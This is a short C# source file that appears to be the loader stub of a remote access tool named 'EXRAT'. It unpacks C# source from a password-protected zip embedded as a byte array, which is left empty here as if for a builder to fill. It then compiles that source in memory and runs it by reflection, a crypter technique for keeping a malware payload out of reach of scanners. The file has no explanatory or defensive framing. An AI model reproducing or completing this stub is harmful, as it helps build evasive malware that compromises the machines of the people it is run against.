using Ionic.Zip;
using Microsoft.CSharp;
using System.CodeDom.Compiler;
using System.IO;
using System.Linq;
using System.Text;

namespace Exrat_Encrypted
{
    internal class Program
    {
        private static void Main(string[] args)
        {
            using (MemoryStream Extracted = new MemoryStream())
            {
                using (MemoryStream stream = new MemoryStream(new byte[] { }))
                {
                    using (ZipFile ZipF = ZipFile.Read(stream))
                    {
                        ZipF.Password = "";
                        ZipF.FirstOrDefault().Extract(Extracted);
                    }
                }


                RunCode(Encoding.ASCII.GetString(Extracted.ToArray()), new string[] { }, "EXRAT", "Program", "Main");
            }
        }
        public static void RunCode(string Source, string[] ReferencedAssemblies, string Namespace, string Class, string Method)
        {
            object o = new CSharpCodeProvider().CompileAssemblyFromSource(new CompilerParameters(ReferencedAssemblies), Source).CompiledAssembly.CreateInstance(Namespace + "." + Class);
            o.GetType().GetMethod(Method).Invoke(o, null);
        }
    }
}
